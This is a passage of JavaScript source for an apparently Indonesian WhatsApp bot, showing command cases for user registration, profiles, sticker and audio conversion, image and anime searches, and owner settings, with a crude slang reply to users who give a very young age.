			if(!db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(!text) return alpha.send1ButMes(m.chat, `Example : ${prefix + command} 8kapqlPnapQp` , `© ${ownername}`, `.ceksn`, 'Check SN', m)
			if(db.data.users[m.sender].serialNumber !== args[0]) return alpha.send1ButMes(m.chat, lang.Noseri() , `© ${ownername}`, `ceksn`, 'Check SN', m)
			db.data.users[m.sender].registered = false
			reply(lang.NoseriOk())
			}
		break
		case 'ceksn': case 'serialnumber':{
			if(!db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			alpha.send1ButMes(m.chat, 'Serial Number 👇\n\n' + db.data.users[m.sender].serialNumber , `© ${ownername}`, `.unreg ` + db.data.users[m.sender].serialNumber, 'Unreg Now', m)
			}
		break
case 'daftar': case 'regis': case 'register':{
			if(db.data.users[m.sender].registered) return reply(lang.DoneReg())
			arg = args.join(' ')
			namax = arg.split('|')[0]
			//if(namax.length > 30) return reply(lang.NamaReg())
			umurx = arg.split('|')[1]
			if(m.isGroup){
			await m.reply('🇮🇩 _Bot telah mengirimkan list pendaftaran ke private chat, silahkan selesaikan agar dapat menggunakan fitur bot_\n\n🇺🇸 _The bot has sent a registration list to the private chat, please complete it so you can use the bot feature_')
			if(!umurx) return alpha.sendListAge(m.sender, pushname, {quoted: m})
			} else {
				if(!umurx) return alpha.sendListAge(m.sender, pushname, {quoted: m})
			if(isNaN(umurx)) return reply(lang.UmurReg())
			if(parseInt(umurx) > 99) return reply(lang.UmurXReg())
			if(parseInt(umurx) < 5) return reply('Bocil kintil, Mending nyusu sana ama mak lu')
			genderx = arg.split('|')[2]
			if(!genderx) return alpha.sendListGender(m.sender, pushname, text, {quoted: m})
			if (!['male', 'female', 'Male', 'Female', 'cewe', 'cowo', 'pria', 'wanita','Cowo', 'Cewe','Pria', 'Wanita'].includes(genderx)) return alpha.sendListGender(m.chat, pushname, text, {quoted: m})
			langx = arg.split('|')[3]
			if(!langx) return alpha.sendListLang(m.sender, pushname, text, {quoted: m})
			if (!['id', 'en', 'sp'].includes(langx)) return alpha.sendListLang(m.chat, pushname, text, {quoted: m})
			const cryptoRandomString = require('crypto-random-string');
			let user = db.data.users[m.sender]
			user.registered = true
			user.name = namax.slice(0, 1).toUpperCase() + namax.slice(1)
			user.age = umurx
			user.gender = genderx.slice(0, 1).toUpperCase() + genderx.slice(1)
			user.language = langx
			user.regTime = + new Date
			user.serialNumber = cryptoRandomString(20);
			m.reply('🇮🇩 _Data kamu sedang di kumpulkan, tunggu sebentar..._\n\n🇺🇸 _Your data is being collected, wait a moment..._')
			await sleep(3000)
			if(langx == 'id'){
			await alpha.sendButImage(m.chat, m.sender ,[{buttonId: '.menu',buttonText:{displayText: '✅ Command'},type: 1},{buttonId:'.profile',buttonText: {displayText:'Profile 👤'}, type: 1}], indonesia.RegReg(cryptoRandomString(20), tanggal(new Date()), namax.slice(0, 1).toUpperCase() + namax.slice(1), umurx, genderx.slice(0, 1).toUpperCase() + genderx.slice(1), m.sender.split('@')[0], prefix, prefix, Object.keys(global.db.data.users).length), `© ${ownername}`, [m.sender], {quoted: m } )
			} else if(langx == 'en'){
				await alpha.sendButImage(m.chat, m.sender ,[{buttonId: '.menu',buttonText:{displayText: '✅ Command'},type: 1},{buttonId:'.profile',buttonText: {displayText:'Profile 👤'}, type: 1}], english.RegReg(cryptoRandomString(20), tanggal_(new Date()), namax.slice(0, 1).toUpperCase() + namax.slice(1), umurx, genderx.slice(0, 1).toUpperCase() + genderx.slice(1), m.sender.split('@')[0], prefix, prefix, Object.keys(global.db.data.users).length), `© ${ownername}`, [m.sender], {quoted: m } )
			} else alpha.sendButImage(m.chat, m.sender ,[{buttonId: '.menu',buttonText:{displayText: '✅ Dominio'},type: 1},{buttonId:'.profile',buttonText: {displayText:'Perfil 👤'}, type: 1}], spanyol.RegReg(cryptoRandomString(20), tanggal__(new Date()), namax.slice(0, 1).toUpperCase() + namax.slice(1), umurx, genderx.slice(0, 1).toUpperCase() + genderx.slice(1), m.sender.split('@')[0], prefix, prefix, Object.keys(global.db.data.users).length), `© ${ownername}`, [m.sender], {quoted: m } )
			
				}
			}
			break
case 'kzowjsijzpappaka':{
			if(db.data.users[m.sender].registered) return reply(lang.DoneReg())
			arg = args.join(' ')
			namax = arg.split('|')[0]
			if(namax.length > 30) return reply(lang.NamaReg())
			umurx = arg.split('|')[1]
			if(!umurx) return alpha.sendListAge(m.sender, pushname, {quoted: m})
			if(isNaN(umurx)) return reply(lang.UmurReg())
			if(parseInt(umurx) > 99) return reply(lang.UmurXReg())
			if(parseInt(umurx) < 5) return reply('Bocil kintil, Mending nyusu sana ama mak lu')
			genderx = arg.split('|')[2]
			if(!genderx) return alpha.sendListGender(m.sender, pushname, text, {quoted: m})
			if (!['male', 'female', 'Male', 'Female', 'cewe', 'cowo', 'pria', 'wanita','Cowo', 'Cewe','Pria', 'Wanita'].includes(genderx)) return alpha.sendListGender(m.chat, pushname, text, {quoted: m})
			langx = arg.split('|')[3]
			if(!langx) return alpha.sendListLang(m.sender, pushname, text, {quoted: m})
			if (!['id', 'en', 'sp'].includes(langx)) return alpha.sendListLang(m.chat, pushname, text, {quoted: m})
			const cryptoRandomString = require('crypto-random-string');
			let user = db.data.users[m.sender]
			user.registered = true
			user.name = namax.slice(0, 1).toUpperCase() + namax.slice(1)
			user.age = umurx
			user.gender = genderx.slice(0, 1).toUpperCase() + genderx.slice(1)
			user.language = langx
			user.regTime = + new Date
			user.serialNumber = cryptoRandomString(20);
			m.reply('🇮🇩 _Data kamu sedang di kumpulkan, tunggu sebentar..._\n\n🇺🇸 _Your data is being collected, wait a moment..._')
			await sleep(3000)
			if(langx == 'id'){
			await alpha.sendButImage(m.chat, m.sender ,[{buttonId: '.menu',buttonText:{displayText: '✅ Command'},type: 1},{buttonId:'.profile',buttonText: {displayText:'Profile 👤'}, type: 1}], indonesia.RegReg(cryptoRandomString(20), tanggal(new Date()), namax.slice(0, 1).toUpperCase() + namax.slice(1), umurx, genderx.slice(0, 1).toUpperCase() + genderx.slice(1), m.sender.split('@')[0], prefix, prefix, Object.keys(global.db.data.users).length), `© ${ownername}`, [m.sender], {quoted: m } )
			} else if(langx == 'en'){
				await alpha.sendButImage(m.chat, m.sender ,[{buttonId: '.menu',buttonText:{displayText: '✅ Command'},type: 1},{buttonId:'.profile',buttonText: {displayText:'Profile 👤'}, type: 1}], english.RegReg(cryptoRandomString(20), tanggal_(new Date()), namax.slice(0, 1).toUpperCase() + namax.slice(1), umurx, genderx.slice(0, 1).toUpperCase() + genderx.slice(1), m.sender.split('@')[0], prefix, prefix, Object.keys(global.db.data.users).length), `© ${ownername}`, [m.sender], {quoted: m } )
			} else alpha.sendButImage(m.chat, m.sender ,[{buttonId: '.menu',buttonText:{displayText: '✅ Dominio'},type: 1},{buttonId:'.profile',buttonText: {displayText:'Perfil 👤'}, type: 1}], spanyol.RegReg(cryptoRandomString(20), tanggal__(new Date()), namax.slice(0, 1).toUpperCase() + namax.slice(1), umurx, genderx.slice(0, 1).toUpperCase() + genderx.slice(1), m.sender.split('@')[0], prefix, prefix, Object.keys(global.db.data.users).length), `© ${ownername}`, [m.sender], {quoted: m } )
			
			}
			break
		case 'procfile': case 'profile':{
			try {
				ppnu = await alpha.profilePictureUrl(m.sender, 'image')
		} catch {
			ppnu = 'https://telegra.ph/file/6880771a42bad09dd6087.jpg'
			}
			
			function msToDate(ms) {
		temp = ms
		days = Math.floor(ms / (24*60*60*1000));
		daysms = ms % (24*60*60*1000);
		hours = Math.floor((daysms)/(60*60*1000));
		hoursms = ms % (60*60*1000);
		minutes = Math.floor((hoursms)/(60*1000));
		minutesms = ms % (60*1000);
		sec = Math.floor((minutesms)/(1000));
		return days+" Days "+hours+" Hours "+ minutes + " Minutes";
  }

			let about = (await alpha.fetchStatus(m.sender).catch(console.error) || {}).status || ''
    let { name, pasangan, limit, exp, bank, lastclaim, premiumDate, premium, registered, regTime, age, level, role } = global.db.data.users[m.sender]
    let now = new Date() * 1
    let { min, xp, max } = levelling.xpRange(level, global.multiplier)
    let username = pushname 
    let math = max - xp
if(db.data.users[m.sender].language == 'id'){
alpha.sendMessage(m.chat, {image: {url: ppnu}, caption: indonesia.profile(username, m, about, pasangan, PhoneNumber, exp, min, xp, math, prefix, level, role, limit, registered, tanggal, regTime,premium, msToDate , premiumDate, now, lastclaim) , mentions:[m.sender]}, {quoted:m})
			} else if(db.data.users[m.sender].language == 'en') {
				alpha.sendMessage(m.chat, {image: {url: ppnu}, caption: english.profile(username, m, about, pasangan, PhoneNumber, exp, min, xp, math, prefix, level, role, limit, registered, tanggal_, regTime,premium, msToDate , premiumDate, now, lastclaim) , mentions:[m.sender]}, {quoted:m})
			} else alpha.sendMessage(m.chat, {image: {url: ppnu}, caption: spanyol.profile(username, m, about, pasangan, PhoneNumber, exp, min, xp, math, prefix, level, role, limit, registered, tanggal__, regTime,premium, msToDate , premiumDate, now, lastclaim) , mentions:[m.sender]}, {quoted:m})
			}
			break
	    case 'toimage': case 'toimg': {
				if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
				if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!quoted) return reply(lang.NoToImg(prefix, command))
                if (!/webp/.test(mime)) return reply(lang.NoToImg(prefix, command))
                reply(lang.wait())
                let media = await alpha.downloadAndSaveMediaMessage(quoted)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return reply(lang.ToimgErr())
                    let buffer = fs.readFileSync(ran)
                    alpha.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
                db.data.users[m.sender].limit -= 1
            }
            break
            case 'pinterest': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
				if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
            	if (!text) return reply(lang.KisahNabi(prefix, command, 'Bot whatsapp'))
                reply(lang.wait())
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random(), anu.length)]
                let gam = await getBuffer(result)
				var but = [
				{
					"urlButton": {
						"displayText": "Media Url",
						"url": `${result}`
						}
					}
				]
				
				await alpha.sendMessage(m.chat, {image: gam, caption: text}, {quoted: m})
				.catch((err) => {
                    reply(lang.serverErr)
                })
                db.data.users[m.sender].limit -= 1
				}
            break
            case 'wallpaper': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
				if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
            	if (!text) return reply(lang.KisahNabi(prefix, command, 'Bot whatsapp'))
                reply(lang.wait())
                wallpaper(text).then( async anu =>{
                result = anu[Math.floor(Math.random(), anu.length)]
                let gam = await getBuffer(result.image[0])
				var but = [
				{
					"urlButton": {
						"displayText": "Website",
						"url": `${myweb}`
						}
					}
				]
				await alpha.sendMessage(m.chat, {image: gam, caption: `⭔ Title : ${result.title}\n⭔ Source : ${result.source}\n⭔ Media Url : ${result.image}`}, {quoted: m})
				})
				.catch((err) => {
                    reply(lang.serverErr)
                })
                db.data.users[m.sender].limit -= 1
				}
            break
            case 'wikimedia': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
				if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
            	if (!text) return reply(lang.KisahNabi(prefix, command, 'Bot whatsapp'))
                reply(lang.wait())
                wikimedia(text).then( async anu =>{
                result = anu[Math.floor(Math.random(), anu.length)]
                let gam = await getBuffer(result.image[0])
				var but = [
				{
					"urlButton": {
						"displayText": "Website",
						"url": `${myweb}`
						}
					}
				]
				await alpha.sendMessage(m.chat, {image: gam, caption: `⭔ Title : ${result.title}\n⭔ Source : ${result.source}\n⭔ Media Url : ${result.image}`}, {quoted: m})
				})
				.catch((err) => {
                    reply(lang.serverErr)
                })
                db.data.users[m.sender].limit -= 1
				}
            break
            
            case 'quotesanime': case 'quoteanime': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
				if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                reply(lang.wait())
                quotesAnime().then(async anu =>{
				gam = await getBuffer(picak + 'quotes anime')
                result = anu[Math.floor(Math.random(), anu.length)]
                await alpha.sendButLoc(m.chat,  `_${result.quotes}_\n\nBy *'${result.karakter}'*, ${result.anime}\n\n*_- ${result.up_at}_*`, '©' + ownername, gam, [
{buttonId: `.quotesanime` , buttonText: {displayText: 'Next Quotes'}, type: 1}
], {userJid: m.chat, quoted: m})
				})
				db.data.users[m.sender].limit -= 1
            }
            break
            case 'ping': case 'tes': case 'runtime':
            reply(`Runtime : ${runtime(process.uptime())}`)
            break
            case 'public': {
                if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
                alpha.public = true
                reply(lang.BotPublic())
            }
            break
            case 'self': {
                if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
                alpha.public = false
                reply(lang.BotSelf())
            }
            break
            case 'owner': case 'creator': {
                alpha.sendContact(m.chat, global.owner, m)
            }
            break
            case 'rules':{
            	let gam = await getBuffer(picak + 'Terms and Conditions')
            var but = [
				{
					"urlButton": {
						"displayText": "Website",
						"url": `${myweb}`
						}
					}
				]
				await alpha.sendMessage(m.chat, {image: gam, caption: lang.rules(prefix)}, {quoted: m})
				}
            break
            case 'setcaptionpay':{
			if (!m.isGroup) return reply(lang.groupOnly())
			if (!isGroupAdmins && !isGroupOwner && !isCreator) return reply(lang.adminOnly())
			if(!text) return reply(`Contoh penggunaan: ${prefix + command} Payment`)
			db.data.chats[m.chat].captionPay = text
			alpha.sendButMessage(m.chat, lang.ok() + ' ' + command + '\n\n' + text, `© ${ownername}`, [{buttonId: '.menu', buttonText: {displayText: 'Menu'}, type: 1}], {quoted: fgif})
			}
			break
            case 'donasi': case 'donate':{
            await alpha.sendMessage(m.chat, {image: qris, caption: lang.tos(ownernomer)}, {quoted: m})
    }
 break
      
//Random Anime
				case 'cry':case 'kill':case 'hug':case 'pat':case 'lick':case 'kiss':case 'bite':case 'yeet':case 'neko':case 'bully':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'awoo':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'shinobu':case 'megumin':case 'handhold':{
					if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
				if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
					reply(lang.wait())
					axios.get(`https://api.waifu.pics/sfw/${command}`)
					.then(({data}) => {
						alpha.sendMediaAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })


					})
					db.data.users[m.sender].limit -= 1
					}
					break
				case 'waifu': case 'loli':{
					if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
				if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
					reply(lang.wait())
					axios.get(`https://api.waifu.pics/sfw/waifu`)
					.then(({data}) => {
					alpha.sendImage(m.chat, data.url, lang.ok(), m)
					})
					db.data.users[m.sender].limit -= 1
					}
					break
case 'sgif': case 'stikerin':case 's': case 'sticker': case 'stiker': {
				if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
				if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!quoted) return reply(lang.NoToStik(prefix, command))
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await alpha.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply(lang.NoToStik(prefix, command))
let media = await quoted.download()
let encmedia = await alpha.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(lang.NoToStik(prefix, command))
}
db.data.users[m.sender].limit -= 1
}
break
			case 'setppbot': case 'setpp': {
                if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
                if (!quoted) return reply(lang.NoPpBot(prefix, command))
                if (!/image/.test(mime)) return reply(lang.NoPpBot(prefix, command))
                if (/webp/.test(mime)) return reply(lang.NoPpBot(prefix, command))
                let media = await alpha.downloadAndSaveMediaMessage(quoted)
                await alpha.updateProfilePicture(alpha.user.id, { url: media }).catch((err) => fs.unlinkSync(media))
                reply(lang.ok())
                }
                break
			
			case 'setppgroup': case 'setppgrup': case 'setppgc': {
                if (!m.isGroup) return reply(lang.groupOnly())
                if (!isBotAdmins) return reply(lang.botNotAdmin())
                if (!(isGroupAdmins || isGroupOwner )) return reply(lang.adminOnly())
                if (!quoted) return reply(lang.NoPpBot(prefix, command))
                if (!/image/.test(mime)) return reply(lang.NoPpBot(prefix, command))
                if (/webp/.test(mime)) return reply(lang.NoPpBot(prefix, command))
                let media = await alpha.downloadAndSaveMediaMessage(quoted)
                await alpha.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                reply(lang.ok())
                }
                break    
			case 'toaud': case 'toaudio': {
			if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
            if (!/video/.test(mime) && !/audio/.test(mime)) return reply(lang.ToAud(prefix, command))
            if (!quoted) return reply(lang.ToAud(prefix, command))
            if ((quoted.msg || quoted).seconds > 60) return reply('Maximum 60 seconds!')
            reply(lang.wait())
            let media = await quoted.download()
            let audio = await toAudio(media, 'mp4')
            alpha.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            db.data.users[m.sender].limit -= 1
            }
            break
            case 'tomp3': {
            if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
            if (/document/.test(mime)) return reply(lang.ToMp3(prefix, command))
            if (!/video/.test(mime) && !/audio/.test(mime)) return reply(lang.ToMp3(prefix, command))
            if (!quoted) return reply(lang.ToMp3(prefix, command))
            if ((quoted.msg || quoted).seconds > 60) return reply('Maximum 60 seconds!')
            reply(lang.wait())
            let media = await quoted.download()
            let audio = await toAudio(media, 'mp4')
            alpha.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            db.data.users[m.sender].limit -= 1
            }
            break
            case 'tovn': case 'toptt': {
           	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
            if (!/video/.test(mime) && !/audio/.test(mime)) return reply(lang.ToVn())
            if (!quoted) return reply(lang.ToVn())
            if ((quoted.msg || quoted).seconds > 60) return reply('Maximum 60 seconds!')
            reply(lang.wait())
            let media = await quoted.download()
            let audio = await toPTT(media, 'mp4')
            alpha.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            db.data.users[m.sender].limit -= 1
            }
            break        
            case 'webtonsearch': case 'webtoon':
            if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(lang.KisahNabi(prefix, command, 'Bot whatsapp'))
                await reply(lang.wait())
                zee.Webtoons(q).then(async data => {
                    let txt = `*------「 WEBTOONS-SEARCH 」------*\n\n`
                    for (let i of data) {
                        txt += `*📫 Title :* ${i.judul}\n`
                        txt += `*👍🏻 Like :* ${i.like}\n`
                        txt += `*🤴🏻 Creator :* ${i.creator}\n`
                        txt += `*🎪 Genre :* ${i.genre}\n`
                        txt += `*📚 Url :* ${i.url}\n ----------------------------------------------------------\n`
                    }
                    await reply(txt)
                })
                .catch((err) => {
                    reply(lang.serverErr)
                })
                db.data.users[m.sender].limit -= 1
            break
            case 'drakor':
            if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(lang.KisahNabi(prefix, command, 'fall in love'))
                await reply(lang.wait())
                zee.Drakor(`${text}`).then(async data => {
                    let txt = `*-----「 DRAKOR-SEARCH 」-----*\n\n`
                    for (let i of data) {
                        txt += `*📫 Title :* ${i.judul}\n`
                        txt += `*📆 Years :* ${i.years}\n`
                        txt += `*🎥 Genre :* ${i.genre}\n`
                        txt += `*📚 Url :* ${i.url}\n-----------------------------------------------------\n`
                    }
                    await sendFileFromUrl(from,data[0].thumbnail,txt,m)
                })
                .catch((err) => {
                    reply(lang.serverErr)
                })
                db.data.users[m.sender].limit -= 1
            break
            case 'anime':{
           if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(lang.KisahNabi(prefix, command, 'naruto'))
                await reply(lang.wait())
                zee.Anime(q).then(async data => {
                    let txt = `*-------「 ANIME-SEARCH 」-------*\n\n`
                    for (let i of data) {
                        txt += `*📫 Title :* ${i.judul}\n`
                        txt += `*📚 Url :* ${i.link}\n-----------------------------------------------------\n`
                    }
                    let gam = await getBuffer(data[0].thumbnail.replace('https://www.anime-planet.com',''))
                    var but = [
				{
					"urlButton": {
						"displayText": "Website",
						"url": `${myweb}`
						}
					}
				]
				await alpha.sendButLoc(m.chat,  txt, '©' + ownername, gam, [
{buttonId: `.menu` , buttonText: {displayText: 'Menu'}, type: 1}
], {userJid: m.chat, quoted: m})
				
                })
                .catch((err) => {
                    reply(lang.serverErr)
                })
                db.data.users[m.sender].limit -= 1
                }
            break
            case 'character': case 'karakter':{
